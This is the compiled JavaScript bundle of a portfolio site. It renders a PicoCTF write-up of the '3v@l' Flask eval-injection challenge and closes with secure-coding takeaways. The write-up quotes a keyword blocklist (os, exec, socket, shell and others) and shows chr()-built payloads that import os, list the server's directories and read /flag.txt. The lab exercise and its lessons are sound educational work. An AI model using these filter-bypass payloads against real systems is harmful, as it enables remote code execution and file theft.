(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,64529,e=>{"use strict";var r=e.i(43476),t=e.i(22016);let a={cybersecurity:[{href:"/projects/cybersecurity/ssti1",title:"PicoCTF: SSTI1"},{href:"/projects/cybersecurity/nosql-injection",title:"PicoCTF: No Sql Injection"},{href:"/projects/cybersecurity/eval",title:"PicoCTF: 3v@l"},{href:"/projects/cybersecurity/soap",title:"PicoCTF: SOAP"},{href:"/projects/cybersecurity/cupid-portal",title:"HTCOTB2026 CTF: Cupid's Secret Message"},{href:"/projects/cybersecurity/heartmail",title:"HTCOTB2026 CTF: HeartMail 1.0"},{href:"/projects/cybersecurity/wicys-ctf-01",title:"WICYS CTF: Bunny Tracker Glitch"},{href:"/projects/cybersecurity/wicys-ctf-02",title:"WICYS CTF: Luck Checker"},{href:"/projects/cybersecurity/wicys-ctf-03",title:"WICYS CTF: Bunny Network - Portal Override"},{href:"/projects/cybersecurity/wicys-ctf-04",title:"WICYS CTF: Bunny Overflow"},{href:"/projects/cybersecurity/wicys-ctf-05",title:"WICYS CTF: Rainbow Vault Overflow"},{href:"/projects/cybersecurity/wicys-ctf-06",title:"WICYS CTF: ROP Around the Rainbow"},{href:"/projects/cybersecurity/wicys-ctf-07",title:"WICYS CTF: Scavenger Hunt"},{href:"/projects/cybersecurity/wicys-ctf-08",title:"WICYS CTF: Bunny Network API Override"},{href:"/projects/cybersecurity/wicys-ctf-09",title:"WICYS CTF: Leprechauns Vault"}],"game-dev":[{href:"/projects/game-dev/my-first-game",title:"My First Game"},{href:"/projects/game-dev/ufo",title:"UFO"},{href:"/projects/game-dev/tank-game",title:"Tank Game"},{href:"/projects/game-dev/3d-game",title:"3D Game Engine"},{href:"/projects/game-dev/blackhole-simulator",title:"Blackhole Simulator"}],music:[{href:"/projects/music/blind-justice-investigation",title:"BL1ND JUST1C3: 1NV3ST1G4T1ON"},{href:"/projects/music/beethoven-virus",title:"Beethoven Virus"},{href:"/projects/music/the-longest-moment",title:"The Longest Moment Before a New Beginning"}],auto:[{href:"/projects/auto/transmission-rebuild",title:"Manual Transmission Rebuild (1989 Honda Accord)"}]};function o({category:e,currentPath:o}){let s=a[e],i=s.findIndex(e=>e.href===o);if(-1===i)return null;let n=s[i-1],c=s[i+1];return(0,r.jsxs)("nav",{"aria-label":"Project navigation",className:"mt-12 grid w-full max-w-4xl grid-cols-1 gap-4 md:grid-cols-2",children:[c?(0,r.jsxs)(t.default,{href:c.href,className:"group rounded-2xl border border-gray-200 bg-gray-50 px-5 py-4 transition-colors hover:border-blue-400 hover:bg-blue-50 dark:border-gray-800 dark:bg-gray-900 dark:hover:border-blue-500 dark:hover:bg-blue-950/30",children:[(0,r.jsx)("p",{className:"text-xs font-semibold uppercase tracking-[0.18em] text-gray-500 dark:text-gray-400",children:"← Next Project"}),(0,r.jsx)("p",{className:"mt-2 text-base font-semibold text-gray-900 transition-colors group-hover:text-blue-700 dark:text-gray-100 dark:group-hover:text-blue-300",children:c.title})]}):(0,r.jsxs)("div",{className:"rounded-2xl border border-dashed border-gray-200 bg-gray-50/70 px-5 py-4 opacity-60 dark:border-gray-800 dark:bg-gray-900/70",children:[(0,r.jsx)("p",{className:"text-xs font-semibold uppercase tracking-[0.18em] text-gray-500 dark:text-gray-400",children:"← Next Project"}),(0,r.jsx)("p",{className:"mt-2 text-base font-semibold text-gray-500 dark:text-gray-400",children:"End of category"})]}),n?(0,r.jsxs)(t.default,{href:n.href,className:"group rounded-2xl border border-gray-200 bg-gray-50 px-5 py-4 text-right transition-colors hover:border-blue-400 hover:bg-blue-50 dark:border-gray-800 dark:bg-gray-900 dark:hover:border-blue-500 dark:hover:bg-blue-950/30",children:[(0,r.jsx)("p",{className:"text-xs font-semibold uppercase tracking-[0.18em] text-gray-500 dark:text-gray-400",children:"Previous Project →"}),(0,r.jsx)("p",{className:"mt-2 text-base font-semibold text-gray-900 transition-colors group-hover:text-blue-700 dark:text-gray-100 dark:group-hover:text-blue-300",children:n.title})]}):(0,r.jsxs)("div",{className:"rounded-2xl border border-dashed border-gray-200 bg-gray-50/70 px-5 py-4 text-right opacity-60 dark:border-gray-800 dark:bg-gray-900/70",children:[(0,r.jsx)("p",{className:"text-xs font-semibold uppercase tracking-[0.18em] text-gray-500 dark:text-gray-400",children:"Previous Project →"}),(0,r.jsx)("p",{className:"mt-2 text-base font-semibold text-gray-500 dark:text-gray-400",children:"Start of category"})]})]})}e.s(["default",()=>o],64529)},77509,e=>{"use strict";var r=e.i(43476),t=e.i(22016),a=e.i(64529);let o=`
  :root {
    --bg:        #0d1e2b;
    --surface:   #162838;
    --border:    #2a6080;
    --accent:    #40f0ff;
    --accent2:   #ff6680;
    --accent3:   #70ff50;
    --text:      #e8f4fb;
    --muted:     #e8f4fb;
    --code-bg:   #0a1822;
    --glow:      0 0 16px #40f0ff88;
  }

  .page-wrap *, .page-wrap *::before, .page-wrap *::after { box-sizing: border-box; margin: 0; padding: 0; }

  /* Navbar override specifically for writeup pages to make it fit the theme */
  nav {
    background: var(--bg) !important;
    border-color: var(--border) !important;
  }
  nav ul {
    gap: 2.5rem !important; /* more separated */
  }
  nav ul li {
    margin-left: 0 !important;
  }
  nav .ThemeToggle, nav button {
    display: none !important;
  }
  
  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    font-size: 1.2rem;
    line-height: 1.8;
    min-height: 100vh;
    overflow-x: hidden;
  }

  body::before {
    content: '';
    position: fixed; inset: 0;
    background: repeating-linear-gradient(
      to bottom,
      transparent 0px, transparent 3px,
      rgba(0,0,0,0.08) 3px, rgba(0,0,0,0.08) 4px
    );
    pointer-events: none;
    z-index: 999;
  }

  body::after {
    content: '';
    position: fixed; inset: 0;
    background-image:
      linear-gradient(rgba(0,229,255,0.08) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,229,255,0.08) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
    z-index: 0;
  }

  .page-wrap {
    position: relative;
    z-index: 1;
    max-width: 860px;
    margin: 0 auto;
    padding: 3rem 1.5rem 6rem;
  }

  .back-link {
    display: inline-block;
    margin-bottom: 2rem;
    color: var(--muted);
    text-decoration: none;
    font-size: 1rem;
    transition: color 0.2s ease;
  }
  .back-link:hover {
    color: var(--accent);
    text-decoration: underline;
  }

  .page-wrap header {
    border-bottom: 1px solid var(--border);
    padding-bottom: 2rem;
    margin-bottom: 3rem;
    animation: fadeDown 0.6s ease both;
  }

  .ctf-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.95rem;
    letter-spacing: 0.25em;
    color: var(--accent);
    text-transform: uppercase;
    margin-bottom: 0.5rem;
  }

  .page-wrap header h1 {
    font-family: 'Orbitron', monospace;
    font-size: clamp(2rem, 5vw, 3.4rem);
    font-weight: 900;
    color: #fff;
    text-shadow: var(--glow);
    line-height: 1.1;
    margin-bottom: 1.2rem;
  }

  .meta-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 0.6rem 1.4rem;
    font-family: 'Share Tech Mono', monospace;
    font-size: 1rem;
  }

  .meta-item {
    display: flex;
    align-items: center;
    gap: 0.4rem;
    color: var(--muted);
  }

  .meta-item span.val {
    color: var(--accent);
  }

  .badge {
    display: inline-block;
    padding: 0.15em 0.7em;
    border-radius: 2px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.95rem;
    letter-spacing: 0.08em;
    border: 1px solid;
  }
  .badge.diff-easy   { color: var(--accent3);  border-color: var(--accent3);  background: rgba(57,255,20,0.07); }
  .badge.diff-medium { color: #ffcc00;          border-color: #ffcc00;         background: rgba(255,204,0,0.07); }
  .badge.diff-hard   { color: var(--accent2);   border-color: var(--accent2);  background: rgba(255,63,91,0.07); }

  section {
    margin-bottom: 2.8rem;
    animation: fadeUp 0.5s ease both;
  }

  section:nth-child(1) { animation-delay: 0.1s; }
  section:nth-child(2) { animation-delay: 0.2s; }
  section:nth-child(3) { animation-delay: 0.3s; }
  section:nth-child(4) { animation-delay: 0.4s; }
  section:nth-child(5) { animation-delay: 0.5s; }

  .section-header {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    margin-bottom: 1.2rem;
  }

  .section-num {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    color: var(--accent);
    letter-spacing: 0.1em;
    opacity: 0.7;
  }

  h2 {
    font-family: 'Orbitron', monospace;
    font-size: 1.25rem;
    font-weight: 700;
    color: var(--accent);
    text-transform: uppercase;
    letter-spacing: 0.12em;
  }

  .section-line {
    flex: 1;
    height: 1px;
    background: linear-gradient(to right, var(--border), transparent);
  }

  .card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-left: 3px solid var(--accent);
    padding: 1.2rem 1.4rem;
    margin-bottom: 1rem;
    border-radius: 0 4px 4px 0;
  }

  .card h3 {
    font-family: 'Orbitron', monospace;
    font-size: 1.05rem;
    font-weight: 700;
    color: #fff;
    margin-bottom: 0.5rem;
  }

  .card ul {
    list-style: none;
    padding: 0;
  }

  .card ul li {
    padding: 0.2rem 0 0.2rem 1.2rem;
    position: relative;
    color: var(--text);
  }

  .card ul li::before {
    content: '›';
    position: absolute;
    left: 0;
    color: var(--accent);
  }

  .step {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 4px;
    margin-bottom: 1.2rem;
    overflow: hidden;
    transition: border-color 0.2s;
  }

  .step:hover { border-color: var(--accent); }

  .step-header {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    padding: 0.8rem 1.2rem;
    border-bottom: 1px solid var(--border);
    background: rgba(0,229,255,0.03);
  }

  .step-num {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    color: var(--muted);
    min-width: 2.5rem;
  }

  .step-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 1rem;
    color: #fff;
    flex: 1;
  }

  .step-body {
    padding: 1rem 1.2rem;
  }

  .io-row {
    display: grid;
    grid-template-columns: 60px 1fr;
    gap: 0.4rem 0.8rem;
    margin-bottom: 0.8rem;
    align-items: start;
  }

  .io-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    letter-spacing: 0.1em;
    padding-top: 0.1rem;
  }

  .io-label.in  { color: var(--accent);  }
  .io-label.out { color: var(--accent3); }

  code {
    font-family: 'Share Tech Mono', monospace;
    font-size: 1rem;
    background: var(--code-bg);
    border: 1px solid var(--border);
    padding: 0.5rem 0.8rem;
    display: block;
    border-radius: 2px;
    color: var(--accent);
    word-break: break-all;
    white-space: pre-wrap;
  }

  code.output {
    color: var(--accent3);
  }

  .reason {
    font-size: 1.05rem;
    color: var(--muted);
    margin-top: 0.6rem;
    padding-top: 0.6rem;
    border-top: 1px dashed var(--border);
  }

  .reason strong {
    color: var(--text);
    font-weight: 600;
  }

  .prose {
    font-size: 1.1rem;
    color: var(--text);
    line-height: 1.9;
    margin-bottom: 1rem;
    white-space: pre-wrap;
  }

  .notice-box {
    border: 1px solid var(--border);
    padding: 1.2rem 1.4rem;
    margin-bottom: 1.2rem;
    border-radius: 4px;
    color: var(--text);
    background: transparent;
    font-size: 1.0rem;
    white-space: pre-wrap;
    font-family: 'Share Tech Mono', monospace;
  }

  .flag-box {
    background: var(--code-bg);
    border: 1px solid var(--accent3);
    border-radius: 4px;
    padding: 1.4rem 1.8rem;
    text-align: center;
    box-shadow: 0 0 24px rgba(57,255,20,0.12), inset 0 0 30px rgba(57,255,20,0.04);
  }

  .flag-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.7rem;
    letter-spacing: 0.25em;
    color: var(--muted);
    text-transform: uppercase;
    margin-bottom: 0.6rem;
  }

  .flag-value {
    font-family: 'Share Tech Mono', monospace;
    font-size: 1.05rem;
    color: var(--accent3);
    text-shadow: 0 0 10px rgba(57,255,20,0.5);
    word-break: break-all;
  }

  .tags {
    display: flex;
    flex-wrap: wrap;
    gap: 0.5rem;
    margin-top: 0.8rem;
  }

  .tag {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    letter-spacing: 0.1em;
    padding: 0.2em 0.7em;
    border: 1px solid var(--border);
    color: var(--muted);
    border-radius: 2px;
    background: rgba(255,255,255,0.03);
  }

  footer {
    margin-top: 4rem;
    padding-top: 1.5rem;
    border-top: 1px solid var(--border);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    color: var(--muted);
    display: flex;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 0.5rem;
  }

  @keyframes fadeDown {
    from { opacity: 0; transform: translateY(-16px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(12px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  @media (max-width: 600px) {
    .io-row { grid-template-columns: 1fr; }
    .io-label { margin-bottom: 0.2rem; }
  }
`;function s({data:e,currentPath:s}){let i=`diff-${e.difficulty}`;return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)("style",{children:o}),(0,r.jsx)("link",{href:"https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap",rel:"stylesheet"}),(0,r.jsxs)("div",{className:"page-wrap",children:[(0,r.jsx)(t.default,{href:"/projects/cybersecurity",className:"back-link",children:"← Back to Cybersecurity Projects"}),(0,r.jsxs)("header",{children:[(0,r.jsx)("div",{className:"ctf-label",children:"PicoCTF — Write-Up"}),(0,r.jsx)("h1",{children:e.title}),(0,r.jsxs)("div",{className:"meta-grid",children:[(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Category:"}),(0,r.jsx)("span",{className:"val",children:e.category})]}),(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Points:"}),(0,r.jsx)("span",{className:"val",children:e.points})]}),(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Author:"}),(0,r.jsx)("span",{className:"val",children:e.author})]}),(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Difficulty:"}),(0,r.jsx)("span",{className:`badge ${i}`,children:e.difficulty.charAt(0).toUpperCase()+e.difficulty.slice(1)})]})]}),(0,r.jsx)("div",{className:"tags",children:e.tags.map(e=>(0,r.jsxs)("span",{className:"tag",children:["#",e]},e))})]}),e.sections.map((e,t)=>(0,r.jsxs)("section",{children:[(0,r.jsxs)("div",{className:"section-header",children:[(0,r.jsx)("span",{className:"section-num",children:String(t+1).padStart(2,"0")}),(0,r.jsx)("h2",{children:e.title}),(0,r.jsx)("div",{className:"section-line"})]}),e.prose&&(0,r.jsx)("p",{className:"prose",children:e.prose}),e.notice&&(0,r.jsx)("div",{className:"notice-box",children:e.notice}),e.cards?.map((e,t)=>(0,r.jsxs)("div",{className:"card",children:[(0,r.jsx)("h3",{children:e.title}),(0,r.jsx)("ul",{children:e.items.map((e,t)=>(0,r.jsx)("li",{dangerouslySetInnerHTML:{__html:e}},t))})]},t)),e.steps?.map((e,t)=>(0,r.jsxs)("div",{className:"step",children:[(0,r.jsxs)("div",{className:"step-header",children:[(0,r.jsxs)("span",{className:"step-num",children:["STEP ",e.number]}),(0,r.jsx)("span",{className:"step-label",children:e.label})]}),(0,r.jsxs)("div",{className:"step-body",children:[e.prose&&(0,r.jsx)(r.Fragment,{children:e.prose.split("\n\n").map((e,t)=>(0,r.jsx)("p",{className:"prose",children:e},t))}),e.notice&&(0,r.jsx)("div",{className:"notice-box",children:e.notice}),e.input&&(0,r.jsxs)("div",{className:"io-row",children:[(0,r.jsx)("span",{className:"io-label in",children:"INPUT"}),(0,r.jsx)("code",{children:e.input})]}),e.output&&(0,r.jsxs)("div",{className:"io-row",children:[(0,r.jsx)("span",{className:"io-label out",children:"OUTPUT"}),(0,r.jsx)("code",{className:"output",children:e.output})]}),e.reason&&(0,r.jsx)("p",{className:"reason",dangerouslySetInnerHTML:{__html:e.reason}})]})]},t))]},t)),e.flag&&(0,r.jsxs)("section",{children:[(0,r.jsxs)("div",{className:"section-header",children:[(0,r.jsx)("span",{className:"section-num",children:"FF"}),(0,r.jsx)("h2",{children:"Flag"}),(0,r.jsx)("div",{className:"section-line"})]}),(0,r.jsxs)("div",{className:"flag-box",children:[(0,r.jsx)("div",{className:"flag-label",children:"Captured Flag"}),(0,r.jsx)("div",{className:"flag-value",children:"[REDACTED]"})]})]}),(0,r.jsxs)("footer",{children:[(0,r.jsxs)("span",{children:[e.author," — PicoCTF Write-Up"]}),(0,r.jsx)("span",{children:"All steps performed in a legal CTF environment."})]}),(0,r.jsx)(a.default,{category:"cybersecurity",currentPath:s})]})]})}e.s(["default",()=>s])},57903,e=>{"use strict";var r=e.i(43476),t=e.i(77509);function a(){let e={title:"3v@l",category:"Web Exploitation",points:"n/a",author:"Kelvin Creighton",difficulty:"medium",tags:["web","eval","python","flask","rce"],flag:"picoCTF{...}",sections:[{title:"Research",cards:[{title:"Why eval is dangerous?",items:["Executes a string as code.","What more is to be said honestly. (at least for this challenge)"]}]},{title:"Information Gathering",prose:"Taking a look at the HTML in the Inspector section in the Developer Tools we find this hint:",notice:"TODO\n------------\nSecure python_flask eval execution by \n    1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind\n    2.Implementing regex: r'0x[0-9A-Fa-f]+|\\\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\\.[A-Za-z0-9]{1,3}\\b|[\\\\\\/]|\\.\\.'",steps:[{number:"01",label:"Breaking Down the Regex",prose:"If we break down the regex, which has many parts split by the | (or) operator, we can see what it will and will not match with:\n\n- `0x[0-9A-Fa-f]+`: One or more hexadecimal digits (0–9, A–F, a–f).\n- `\\\\u[0-9A-Fa-f]{4}`: Literally \\u (the regex has \\\\u so it matches one backslash + u). Exactly four hex digits.\n- `%[0-9A-Fa-f]{2}`: Literally %. Exactly two hex digits.\n- `\\.[A-Za-z0-9]{1,3}\\b`: Literal dot. 1 to 3 alphanumeric characters. Word boundary.\n- `[\\\\\\/]`: Matches either a backslash \\ or a forward slash /.\n- `\\.\\.`: Matches .. (two dots)."},{number:"02",label:"Analyzing Matches vs Non-Matches",prose:"Examples of what Matches and Doesn't Match:\n\n- Hex literal: Matches `0xFF`, Doesn't Match `0x`\n- Unicode escape: Matches `\\u0041`, Doesn't Match `\\u123`\n- Percent encoding: Matches `%20`, Doesn't Match `%2`\n- File extension: Matches `.js`, Doesn't Match `.jpeg`\n- Double dot: Matches `..`, Doesn't Match `...`\n\nNotice that underscores are also not blacklisted. This will come in handy later..."}]},{title:"Creating the Payload",prose:"We know we can't use the `ls` command. However, there may still be a way to run a 'list directories' using `os.listdir()`. The problem is that the keyword `os` is also blacklisted.",steps:[{number:"01",label:"Bypassing the Keyword Blacklist",input:"chr(111)+chr(115)",output:"os",reason:"<strong>Reason:</strong> A trick we can use is through the `chr()` function to evaluate the letters. This outputs `os`, but it is still just a string object."},{number:"02",label:"Importing the `os` Module",input:"__import__(chr(111)+chr(115)).listdir()",output:"['app.py', 'static', 'templates']",reason:"<strong>Reason:</strong> This is equivalent to `__import__('os').listdir()`. It allows us to list the current directory contents."},{number:"03",label:"Exploring the Root Directory",input:"__import__(chr(111)+chr(115)).listdir(chr(47))",output:"['flag.txt', ...]",reason:"<strong>Reason:</strong> Now we dig around and find the `flag.txt` file in the `/` directory. We use `chr(47)` to represent the forward slash `/` since it's blacklisted by the regex."},{number:"04",label:"Reading the Flag",input:"open(chr(47)+'flag.'+chr(116)+'xt').read()",output:"[Flag Content]",reason:"<strong>Reason:</strong> We need to open and read the file. But remember we are restricted with the regex (`/` is blacklisted along with any 1-3 letters after a dot). So instead we use `chr()` again to thwart the regex blacklist. A more robust solution would be `__import__('builtins').open(chr(47)+'flag.'+chr(116)+'xt').read()`."}]},{title:"Key Takeaways",cards:[{title:"",items:["Do not use `eval()` on user-supplied input. It leads to Remote Code Execution.","Blacklists and regex filters are often insufficient to prevent code execution because attackers can obfuscate or build the payloads using built-in functions like `chr()` and dynamic imports."]}]}]};return(0,r.jsx)(t.default,{data:e,currentPath:"/projects/cybersecurity/eval"})}e.s(["default",()=>a])}]);